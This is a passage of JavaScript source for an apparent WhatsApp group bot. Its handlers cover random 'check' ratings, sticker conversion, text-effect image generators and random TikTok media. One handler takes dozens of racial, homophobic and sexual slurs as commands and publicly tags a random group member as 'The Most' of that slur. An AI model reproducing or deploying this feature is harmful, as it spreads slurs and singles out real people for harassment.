					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(ppuser)
yudamods.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
if (!/webp/.test(mime)) return replygcTzy(`balas stiker dengan caption *${prefix+command}*`)
let media = await yudamods.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return replygcTzy(err)
let buffer = fs.readFileSync(ran)
yudamods.sendMessage(m.chat, { image: buffer, jpegThumbnail: defaultpp }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPrem) return replyprem(mess.premium)
if (!args.join(" ")) return replygcTzy(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
yudamods.downloadAndSaveMediaMessage(quoted, "gifee")
yudamods.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await yudamods.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcTzy('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await yudamods.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
replygcTzy(`Photo/Video?`)
}
}
break
case 'sticker': 
case 's': {
if (!quoted) return replygcTzy(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await yudamods.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcTzy('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await yudamods.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
replygcTzy(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'stupid':
      case 'foolish':
      case 'smart':
      case 'idiot':
      case 'gay':
      case 'lesbi':
      case 'bastard':
      case 'stubble':
      case 'dog':
      case 'fuck':
      case 'ape':
      case 'noob':
      case 'great':
      case 'horny':
      case 'wibu':
      case 'asshole':
      case 'handsome':
      case 'beautiful':
      case 'cute':
      case 'kind':
      case 'ugly':
      case 'pretty':
      case 'lesbian':
      case 'randi':
      case 'gandu':
      case 'madarchod':
      case 'kala':
      case 'gora':
      case 'chutiya':
      case 'nibba':
      case 'nibbi':
      case 'bhosdiwala':
      case 'chutmarika':
      case 'bokachoda':
      case 'suarerbaccha':
      case 'bolochoda':
      case 'muthal':
      case 'muthbaaz':
      case 'randibaaz':
      case 'topibaaz':
      case 'cunt':
      case 'nerd':
      case 'behenchod':
      case 'behnchoda':
      case 'bhosdika':
      case 'nerd':
      case 'mc':
      case 'bsdk':
      case 'bhosdk':
      case 'nigger':
      case 'loda':
      case 'laund':
      case 'nigga':
      case 'noobra':
      case 'tharki':
      case 'nibba':
      case 'nibbi':
      case 'mumu':
      case 'rascal':
      case 'scumbag':
      case 'nuts':
      case 'comrade':
      case 'fagot':
      case 'scoundrel':
      case 'ditch':
      case 'dope':
      case 'gucci':
      case 'lit':
      case 'dumbass':
      case 'sexy':
      case 'crackhead':
      case 'mf':
      case 'motherfucker':
      case 'dogla':
      case 'bewda':
      case 'boka':
      case 'khanki':
      case 'bal':
      case 'sucker':
      case 'fuckboy':
      case 'playboy':
      case 'fuckgirl':
      case 'playgirl':
      case 'hot': {
if (!m.isGroup) return replygcTzy(mess.group)
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
yudamods.sendMessage(m.chat,
{ text: `The Most ${command} Here Is @${org.split('@')[0]}`,
contextInfo:{
mentionedJid:[org],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./TzyMedia/theme/cheemspic.jpg`),
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`}}},
{ quoted: m})
}
break
case 'quotes':
const quoteTzyy = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quoteTzyy.data.quote.body}\n\n*${themeemoji} Author:* ${quoteTzyy.data.quote.author}`
return replygcTzy(textquotes)
break
case 'handsomecheck':
				if (!text) return replygcTzy(`Tag Someone, Example : ${prefix + command} @Tzy`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
yudamods.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcTzy(`Tag Someone, Example : ${prefix + command} @Tzy`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
yudamods.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcTzy(`Tag Someone, Example : ${prefix + command} @Tzy`)
					const Tzyy =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = Tzyy[Math.floor(Math.random() * Tzyy.length)]
					yudamods.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return replygcTzy(mess.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
yudamods.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
yudamods.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
yudamods.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcTzy(`Example ${prefix+command} const Tzybot = require('baileys')`)
let meg = await obfus(q)
replygcTzy(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcTzy('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcTzy(teks)
	    }
	    break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcTzy(`Example : ${prefix+command} yudamods`) 
replygcTzy(mess.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
yudamods.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcTzy(`Example : ${prefix+command} yudamods`) 
replygcTzy(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
yudamods.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcTzy(`Example : ${prefix+command} yudamods`) 
replygcTzy(mess.wait)
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
yudamods.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'tiktokgirl':
replygcTzy(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
yudamods.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
replygcTzy(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
yudamods.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
replygcTzy(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
yudamods.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
replygcTzy(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
yudamods.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
replygcTzy(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
yudamods.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
replygcTzy(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
yudamods.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
replygcTzy(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
yudamods.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
